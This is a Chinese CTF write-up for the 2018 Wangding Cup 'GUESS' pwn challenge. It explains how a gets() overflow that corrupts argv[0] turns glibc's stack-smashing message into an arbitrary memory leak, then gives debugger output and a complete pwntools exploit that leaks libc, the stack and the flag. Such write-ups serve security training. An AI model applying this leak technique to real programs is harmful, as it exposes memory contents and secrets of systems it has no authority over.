# 网鼎杯-2018-GUESS

### 0x0 前置补偿

1. 当开启CANARY保护之后，CANARY被破坏之后就会来到这个函数：

   ```c
   void __attribute__ ((noreturn)) __stack_chk_fail (void)
   {
     __fortify_fail ("stack smashing detected");
   }
   
   void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
   {
     /* The loop is added only to keep gcc happy.  */
     while (1)
       __libc_message (2, "*** %s ***: %s terminated\n",
                       msg, __libc_argv[0] ?: "<unknown>");
   }
   ```

   他会打印`argv[0]`。如果，把它更改为为某个函数的GOT就会泄漏libc地址。修改为某变量的地址，就会泄漏这个变量的内容。

2. `environ`变量存储了栈上环境变量的地址。可以拿来泄漏栈地址。

### 0x1 分析

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]
  int v5; // [rsp+1Ch] [rbp-84h]
  __int64 count; // [rsp+20h] [rbp-80h]
  __int64 max; // [rsp+28h] [rbp-78h]
  char buf; // [rsp+30h] [rbp-70h]
  char s2; // [rsp+60h] [rbp-40h]
  unsigned __int64 v10; // [rsp+98h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  max = 3LL;
  LODWORD(stat_loc.__uptr) = 0;
  count = 0LL;
  init_proc();
  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0, a2);
  if ( HIDWORD(stat_loc.__iptr) == -1 )
  {
    perror("./flag.txt");
    _exit(-1);
  }
  read(SHIDWORD(stat_loc.__iptr), &buf, 0x30uLL);
  close(SHIDWORD(stat_loc.__iptr));
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( count >= max )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    v5 = Fork();
    if ( !v5 )
      break;
    ++count;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(&s2);
  if ( !strcmp(&buf, &s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```

前期并没有什么漏洞，我们可以猜测flag，但是被限制次数。所以我们不能通过爆破来爆破出flag。

后面倒是有个漏洞`gets()`，可以覆盖main 的 ret，但是，有CANARY的保护，再往后没有其他漏洞了。

#### 漏洞利用

这里可以使用`__stack_chk_fail()`函数，来泄漏任意地址。由于`gets()`函数可以让我们输入任意长度的数据所以，我们可以覆盖`argv[0]`，来泄漏任意数据。

1. 通过已有的GOT来泄漏libc

   ```shell
   0c:0060│ rdx rsi  0x7fffffffe470 ◂— 'asdasdadsadasdsa'
   [···]
   2d:0168│          0x7fffffffe578 —▸ 0x4008d9 ◂— hlt
   2e:0170│          0x7fffffffe580 —▸ 0x7fffffffe588 ◂— 0x1c
   2f:0178│          0x7fffffffe588 ◂— 0x1c
   30:0180│ r13      0x7fffffffe590 ◂— 0x1
   31:0188│          0x7fffffffe598 —▸ 0x7fffffffe7d0 ◂— '/root/pwn/wdb2018/guess/GUESS'
   32:0190│          0x7fffffffe5a0 ◂— 0x0
   33:0198│          0x7fffffffe5a8 —▸ 0x7fffffffe7ee ◂— 'LC_TERMINAL_VERSION=3.3.8'
   34:01a0│          0x7fffffffe5b0 —▸ 0x7fffffffe808 ◂— 'LANG=en_US.UTF-8'
   35:01a8│          0x7fffffffe5b8 —▸ 0x7fffffffe819 ◂— 'LC_TERMINAL=iTerm2'
   
   pwndbg> distance 0x7fffffffe470 0x7fffffffe598
   0x7fffffffe470->0x7fffffffe598 is 0x128 bytes (0x25 words)
   pwndbg>
   ```

   得到输入位置和`argv[0]`的偏移，来构造`payload`来泄漏libc。

2. 然后通过`environ`变量来泄漏栈地址

   通过`libc`可以得到`environ`的地址，把`argv[0]`再次更改成`environ`，可以泄漏出栈地址。

   更改之前：

   ```shell
   0x7fff06598598 —▸ 0x7fff065987e2 ◂— 0x53534555472f2e /* './GUESS' */
   ```

   更改之后：

   ```shell
   0x7fff06598598 —▸ 0x7f09d32a6f38 (environ)
   ```

3. 最后通过栈地址和`flag`的偏移来泄漏`flag`。

   更改之前：（拿了一个新的进程来调试的）

   ```shell
   0x7ffc71813198 —▸ 0x7ffc718137e2 ◂— 0x53534555472f2e /* './GUESS' */
   ```

   更改之后：

   ```shell
   0x7ffc71813198 —▸ 0x7ffc71813040 ◂— 'flag{hahahhahah}\n'
   ```

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./GUESS')
# p = remote('node3.buuoj.cn', 29156)
elf = ELF('./GUESS')
offset = 0x128
environ_offset = 0x168

def debug(p, cmd):
  gdb.attach(p, cmd)
  pause()

# leak libc
payload = 'a' * offset + p64(elf.got['gets'])
p.sendlineafter('Please type your guessing flag\n', payload)
p.recvuntil('*** stack smashing detected ***: ')
gets_addr = u64(p.recvuntil('\x7f').ljust(8, '\x00'))
libc = LibcSearcher('gets', gets_addr)
libc_base = gets_addr - libc.dump('gets')
environ = libc_base + libc.dump('environ')
success('gets : ' + str(hex(gets_addr)))
success('libc : ' + str(hex(libc_base)))
success('environ : ' + str(hex(environ)))
# debug(p, 'environ\n')

# leak stack
payload = 'a' * offset + p64(environ)
p.sendlineafter('Please type your guessing flag\n', payload)
p.recvuntil('*** stack smashing detected ***: ')
stack = u64(p.recvuntil('\x7f').ljust(8, '\x00'))
flag = stack - environ_offset
success('stack environ : ' + str(hex(stack)))
# debug(p, '\n')

# leak flag
payload = 'a' * offset + p64(flag)
p.sendlineafter('Please type your guessing flag\n', payload)
p.recvuntil('*** stack smashing detected ***: ')
p.interactive()
```

